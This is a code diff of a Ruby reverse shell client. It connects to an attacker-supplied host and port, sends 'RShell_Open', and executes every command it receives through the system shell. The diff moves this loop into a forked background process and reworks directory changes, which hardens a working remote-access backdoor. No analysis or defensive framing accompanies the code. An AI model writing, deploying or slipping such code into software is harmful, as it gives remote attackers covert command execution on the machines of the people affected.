@@ -1,32 +1,31 @@
 require "socket"
 
+
+
 if ARGV[0] && ARGV[1]
-host = ARGV[0]
-port = ARGV[1].to_i
+	host = ARGV[0]
+	port = ARGV[1].to_i
 else
-print "Host: "
-host = gets.chomp
-print "Port: "
-port = gets.chomp.to_i
+	print "Host: "
+	host = gets.chomp
+	print "Port: "
+	port = gets.chomp.to_i
 end
-
-
-
-host = TCPSocket.open(host, port)
-host.puts "RShell_Open"
-
-begin
-	`pwd`
-	currentDirCommand = "pwd"
-	joiner = "\; "
-rescue
-	`cd`
-	currentDirCommand = "cd"
-	joiner = "\& "
-end
-host.puts currentDirCommand
-$currentDir = ""
 fork do
+	host = TCPSocket.open(host, port)
+	host.puts "RShell_Open"
+
+	begin
+		`pwd`
+		currentDirCommand = "pwd"
+		joiner = "\; "
+	rescue
+		`cd`
+		currentDirCommand = "cd"
+		joiner = "\& "
+	end
+	host.puts currentDirCommand
+	$currentDir = "."
 	loop do
 		cmd = host.gets.chomp
 		if cmd.downcase == "exit"
@@ -35,8 +34,8 @@ fork do
 		else
 			begin
 				if cmd.split(" ")[0].downcase == "cd" && cmd.split(" ")[1]
-					$currentDir = `cd "#{$currentDir}"#{joiner}#{cmd}#{joiner}#{currentDirCommand}`.chomp
-					out = "Changed Directory\n"
+					$currentDir = `cd "#{$currentDir}"#{joiner}cd "#{cmd.downcase.sub("cd ", "")}"#{joiner}#{currentDirCommand}`.chomp
+					out = "Changed Directory to #{$currentDir}\n"
 				else
 					out = `cd "#{$currentDir}"#{joiner}#{cmd.chomp}`
 				end
